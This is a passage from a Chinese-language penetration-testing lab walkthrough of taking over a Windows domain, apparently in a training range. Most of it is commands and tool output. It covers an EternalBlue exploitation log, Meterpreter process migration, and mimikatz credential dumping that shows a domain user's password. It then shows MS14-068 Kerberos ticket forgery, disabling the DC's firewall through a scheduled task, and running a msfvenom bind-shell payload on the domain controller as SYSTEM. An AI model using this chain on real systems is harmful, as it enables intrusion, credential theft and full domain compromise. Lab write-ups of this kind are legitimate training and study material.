        [+] 192.168.183.131:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.          
        [*] 192.168.183.131:445 - Sending final SMBv2 buffers.                     
        [*] 192.168.183.131:445 - Sending last fragment of exploit packet!
        [*] 192.168.183.131:445 - Receiving response from exploit packet
        [+] 192.168.183.131:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!                     
        [*] 192.168.183.131:445 - Sending egg to corrupted connection.  
        [*] 192.168.183.131:445 - Triggering free of corrupted buffer.    
        [*] Sending stage (201798 bytes) to 192.168.183.131                                                      
        [*] Session ID 3 (192.168.183.129:50614 -> 192.168.183.131:6756 via session 1) processing AutoRunScript 'post/windows/manage/migrate' 
        [*] Running module against TESTWIN7-PC                                                                   
        [*] Current server process: spoolsv.exe (1104)                                                           
        [*] Spawning notepad.exe process to migrate into                                                         
        [*] Spoofing PPID 0                                                                                      
        [*] Migrating into 836                                                                                   
        [+] Successfully migrated into process 836                                                               
        [+] 192.168.183.131:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
        [+] 192.168.183.131:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=                  
        [+] 192.168.183.131:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=        
        [*] Meterpreter session 3 opened (192.168.183.129:50614 -> 192.168.183.131:6756 via session 1) at 2024-12-03 18:51:01 +0800
        ```
        
    - `WIN-ENS2VR5TR3N` `192.168.183.130` DC，成功不了，可能是考别的知识点

### 抓取密码

1. MSF加载`mimikatz`模块
    
    ```c
    meterpreter > load kiwi
    Loading extension kiwi...
      .#####.   mimikatz 2.2.0 20191125 (x64/windows)
     .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
     ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
     ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
     '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
      '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
    
    Success.
    ```
    
2. 抓取密码
    
    ```c
    meterpreter > creds_all
    wdigest credentials
    ===================
    
    Username      Domain  Password
    --------      ------  --------
    (null)        (null)  (null)
    TESTWIN7-PC$  DEMO    /-LDA[1d hf-tfj)O)yNyCgh[o#D[h7I/*-'ShnKX%X7`wWWdrLDd`!EUceLQ8:y!J?TD5KY*iuQ32i8He_D#JyWDWIzuYDDytr)\J7(_e(Fctsjl.Zd"JRr
    douser        DEMO    Dotest123
    ```
    
    抓取域用户`douser`的密码`Dotest123`
    

### Win7开启RDP

1. 查看权限
    
    ```c
    meterpreter > getuid
    Server username: NT AUTHORITY\SYSTEM
    ```
    
2. 开启`RDP`服务，使用`MSF`模块
    
    ```c
    meterpreter > run post/windows/manage/enable_rdp 
    
    [*] Enabling Remote Desktop
    [*]     RDP is disabled; enabling it ...
    [*] Setting Terminal Services service startup mode
    [*]     The Terminal Services service is not set to auto, changing it to auto ...
    [*]     Opening port in local firewall if necessary
    [*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20241203215408_default_192.168.183.131_host.windows.cle_035122.txt
    ```
    
3. 尝试登陆
    
    ```c
    proxychains rdesktop 192.168.183.131 -p Dotest123 -u douser
    ```
    
    ![image.png](image%2057.png)
    
    `DC`上应该是有策略，不允许该用户登录
    

### 寻找可利用点

1. 在桌面下发现一些常用渗透工具`MS14-068` 可能是要使用该方法来攻略`DC`
    
    ```c
    c:\Users\douser\Desktop>dir
    dir
     Volume in drive C has no label.
     Volume Serial Number is 605F-F555
    
     Directory of c:\Users\douser\Desktop
    
    2020/01/18  12:40    <DIR>          .
    2020/01/18  12:40    <DIR>          ..
    2020/01/11  15:06             2,189 360极速浏览器.lnk
    2020/01/17  14:53            14,336 artifact.exe
    2020/01/11  16:05             5,406 GetUserSPNs.ps1.ps1
    2015/11/19  04:37         1,192,703 Invoke-DCSync.ps1
    2020/01/11  16:37            47,937 Invoke-Kerberoast.ps1
    2020/01/03  02:22         1,040,136 mimikatz.exe
    2020/01/15  17:12         3,492,558 MS14-068.exe
    2004/02/01  13:23           344,576 NetSess.exe
    2020/01/15  15:39           374,944 PsExec64.exe
    2020/01/16  22:13            53,248 PVEFindADUser.exe
    2020/01/16  22:16               193 report.csv
    2020/01/06  22:05             3,175 RProcdump.ps1
    2020/01/17  15:52             2,897 systeiminfo_win7.txt
    2020/01/16  11:30             1,074 TGT_douser@demo.com.ccache
    ```
    

### MS14-068

1. 获取用户SID
    
    首先通过`migrate`到`Douser`的内存下
    
    ```c
    meterpreter > ps
     2116  372   conhost.exe        x64   1        DEMO\douser                   C:\Windows\system32\conhost.exe
     2720  464   taskhost.exe       x64   1        DEMO\douser                   C:\Windows\system32\taskhost.exe
     2784  2852  explorer.exe       x64   1        DEMO\douser                   C:\Windows\Explorer.EXE
     2888  840   dwm.exe            x64   1        DEMO\douser                   C:\Windows\system32\Dwm.exe
    meterpreter > migrate 2784
    [*] Migrating from 836 to 2784...
    [*] Migration completed successfully.
    ```
    
    进入`shell`模式获取用户`SID`
    
    ```c
    meterpreter > shell
    C:\Windows\system32>whoami /all
    SID                                          
    =========== =============================================
    demo\douser S-1-5-21-979886063-1111900045-1414766810-1107
    ```
    
    `S-1-5-21-979886063-1111900045-1414766810-1107`
    
2. 利用桌面的`ms14-068.exe`提权工具生成伪造的`kerberos`协议认证证书
    
    ```c
    c:\Users\douser\Desktop>MS14-068.exe -u douser@demo.com -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130 -p Dotest123
    MS14-068.exe -u douser@demo.com -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130 -p Dotest123
      [+] Building AS-REQ for 192.168.183.130... Done!
      [+] Sending AS-REQ to 192.168.183.130... Done!
      [+] Receiving AS-REP from 192.168.183.130... Done!
      [+] Parsing AS-REP from 192.168.183.130... Done!
      [+] Building TGS-REQ for 192.168.183.130... Done!
      [+] Sending TGS-REQ to 192.168.183.130... Done!
      [+] Receiving TGS-REP from 192.168.183.130... Done!
      [+] Parsing TGS-REP from 192.168.183.130... Done!
      [+] Creating ccache file 'TGT_douser@demo.com.ccache'... Done!
    ```
    
3. 利用`mimikatz` （桌面上也有）来导入票据
    
    ```c
    c:\Users\douser\Desktop>mimikatz.exe
    mimikatz.exe
    
      .#####.   mimikatz 2.2.0 (x64) #18362 Jan  2 2020 19:21:39
     .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
     ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
     ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
     '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
      '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
    
    mimikatz # kerberos::purge
    Ticket(s) purge for current session is OK
    
    mimikatz # kerberos::list
    
    mimikatz # kerberos::ptc C:\users\douser\Desktop\TGT_douser@demo.com.ccache
    
    Principal : (01) : douser ; @ DEMO.COM
    
    Data 0
               Start/End/MaxRenew: 2024/12/3 22:17:14 ; 2024/12/4 8:17:14 ; 2024/12/10 22:17:14
               Service Name (01) : krbtgt ; DEMO.COM ; @ DEMO.COM
               Target Name  (01) : krbtgt ; DEMO.COM ; @ DEMO.COM
               Client Name  (01) : douser ; @ DEMO.COM
               Flags 50a00000    : pre_authent ; renewable ; proxiable ; forwardable ; 
               Session Key       : 0x00000017 - rc4_hmac_nt      
                 d030a0db75eadb9b5f672b49a11721c9
               Ticket            : 0x00000000 - null              ; kvno = 2        [...]
               * Injecting ticket : OK
    ```
    
    操作分别是：清空当前票据，查看当前票据，导入票据
    
4. 查看当前票据
    
    ```c
    mimikatz # kerberos::list
    
    [00000000] - 0x00000017 - rc4_hmac_nt      
       Start/End/MaxRenew: 2024/12/3 22:17:14 ; 2024/12/4 8:17:14 ; 2024/12/10 22:17:14
       Server Name       : krbtgt/DEMO.COM @ DEMO.COM
       Client Name       : douser @ DEMO.COM
       Flags 50a00000    : pre_authent ; renewable ; proxiable ; forwardable ;
    ```
    
5. 尝试通过IPC连接DC
    
    ps：记得使用主机名，否则默认走`NTLM`协议
    
    ```c
    c:\Users\douser\Desktop>dir \\WIN-ENS2VR5TR3N\c$
    dir \\WIN-ENS2VR5TR3N\c$
     Volume in drive \\WIN-ENS2VR5TR3N\c$ has no label.
     Volume Serial Number is 702B-0D1B
    
     Directory of \\WIN-ENS2VR5TR3N\c$
    
    2009/07/14  11:20    <DIR>          PerfLogs
    2020/01/24  13:30    <DIR>          Program Files
    2020/01/24  13:30    <DIR>          Program Files (x86)
    2019/12/31  11:01    <DIR>          Users
    2020/01/24  13:33    <DIR>          Windows
                   0 File(s)              0 bytes
                   5 Dir(s)  11,366,170,624 bytes free
    ```
    
    成功访问到域控，也算拿下了
    

### 上线DC

1. `win7`桌面下还提供呢`Psexec64.exe`
    
    ```c
    c:\Users\douser\Desktop>psexec64 \\WIN-ENS2VR5TR3N.demo.com cmd.exe \ipconfig                            
    psexec64 \\WIN-ENS2VR5TR3N.demo.com cmd.exe \ipconfig                                                    
                                                                                                             
    PsExec v2.2 - Execute processes remotely            
    Copyright (C) 2001-2016 Mark Russinovich                                                                 
    Sysinternals - www.sysinternals.com
                                                                                                             
    Starting cmd.exe on WIN-ENS2VR5TR3N.demo.com...3N.demo.com...demo.com...                                 
    cmd.exe exited on WIN-ENS2VR5TR3N.demo.com with error code 0.  
    ```
    
    但是不知道为什么连不上
    
2. 通过计划任务关闭防火墙
    - 新建`1.bat`文件
        
        ```c
        # vim 1.bat
        netsh advfirewall set allprofiles state off
        ```
        
    - 通过`MSF`上传到靶机`win7`
        
        ```c
        meterpreter > upload ~/Desktop/test/1.bat C:/users/douser/Desktop
        [*] Uploading  : /root/Desktop/test/1.bat -> C:/users/douser/Desktop\1.bat
        [*] Completed  : /root/Desktop/test/1.bat -> C:/users/douser/Desktop\1.bat
        ```
        
    - 在`shell`模式将`1.bat`传到`DC`
        
        ```c
        C:\Windows\system32>copy c:\users\douser\desktop\1.bat \\WIN-ENS2VR5TR3N\c$
        copy c:\users\douser\desktop\1.bat \\WIN-ENS2VR5TR3N\c$
                1 file(s) copied.
        ```
        
    - 创建计划任务关闭防火墙（`ST`是时间，也可以调成手动运行）
        
        ```c
        schtasks /create /S WIN-ENS2VR5TR3N /TN "test1" /TR c:/1.bat /SC ONCE /ST 22:49 /ru system /f
        ```
        
3. 通过计划任务上线`DC`
    - `msfvenom`生成`exe`马
        
        ```c
        msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=192.168.183.130 LPORT=2345 -f exe > shell.exe
        ```
        
    - 用上面的方式上传`exe`马到`DC`
    - Kali监听
        
        ```c
        msf6 exploit(windows/smb/ms17_010_eternalblue) > use exploit/multi/handler 
        msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
        msf6 exploit(multi/handler) > set lport 2345
        msf6 exploit(multi/handler) > set rhost 192.168.183.130
        msf6 exploit(multi/handler) > run
        ```
        
    - 通过计划任务执行`shell.exe`
        
        ```c
        schtasks /create /S WIN-ENS2VR5TR3N /TN "test1" /TR c:/shell.exe /SC ONCE /ST 23:03 /ru system /f
        ```
        
    - 成功上线MSF
        
        ```c
        msf6 exploit(multi/handler) > run
        
        [*] Started bind TCP handler against 192.168.183.130:2345
        [*] Sending stage (201798 bytes) to 192.168.183.130
        [*] Meterpreter session 1 opened (127.0.0.1:44267 -> 127.0.0.1:1080) at 2024-12-03 23:13:39 +0800
        
        meterpreter > 
        ```
        
    - 然后通过`mimikatz`读取密码
        
        ![image.png](image%2058.png)
        
        拿到域管理员密码